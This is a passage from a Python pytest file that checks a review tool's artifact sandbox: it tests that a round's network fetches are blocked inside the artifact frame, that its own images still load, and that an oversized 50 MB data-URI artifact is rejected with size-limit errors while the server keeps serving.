        out = bc.with_live_browser(bring_up, body, Recorder)
        out.update(rid=rid, board=board, sink_url=sink.url)
        yield out
    finally:
        httpd.shutdown()
        httpd.server_close()
        sink.close()
        mp.undo()


def test_a_prototype_round_navigated_into_the_artifact_frame_has_no_network(cross_round):
    assert cross_round["frame_blocked"], "round 1's fetch was not reported blocked in the artifact frame"
    assert cross_round["sink_in_artifact_frame"] == []


def test_a_prototype_round_of_a_mixed_review_still_loads_its_own_image(cross_round):
    assert cross_round["frame_img"] == 1, "round 1's own image did not load in the artifact frame"
    assert cross_round["page_img"] == 1, "round 1's own image did not load in page mode"


# ---------------------------------------------------------------- no browser needed

def test_a_50_mb_data_uri_is_refused_with_a_clear_error_and_the_server_keeps_serving(server, env, tmp_path):
    huge = "<img src=\"data:image/png;base64," + "A" * (50 * 1024 * 1024) + "\">"
    f = tmp_path / "big" / "decisions.json"
    f.parent.mkdir()
    f.write_text(json.dumps({"blocks": [{"type": "artifact", "id": "evil", "html": huge}]}), encoding="utf-8")
    with pytest.raises(store.ReviewError, match=r"larger than \d MB"):      # decisions.json's own cap comes first (3 MB)
        api._spec(str(f), None, None, None)
    with pytest.raises(store.ReviewError, match="artifact html is larger than 2 MB"):   # and the artifact's, if that file were allowed
        store.validate_decisions(json.loads(f.read_text(encoding="utf-8")))
    assert http("GET", server + "/healthz")[0] == 200
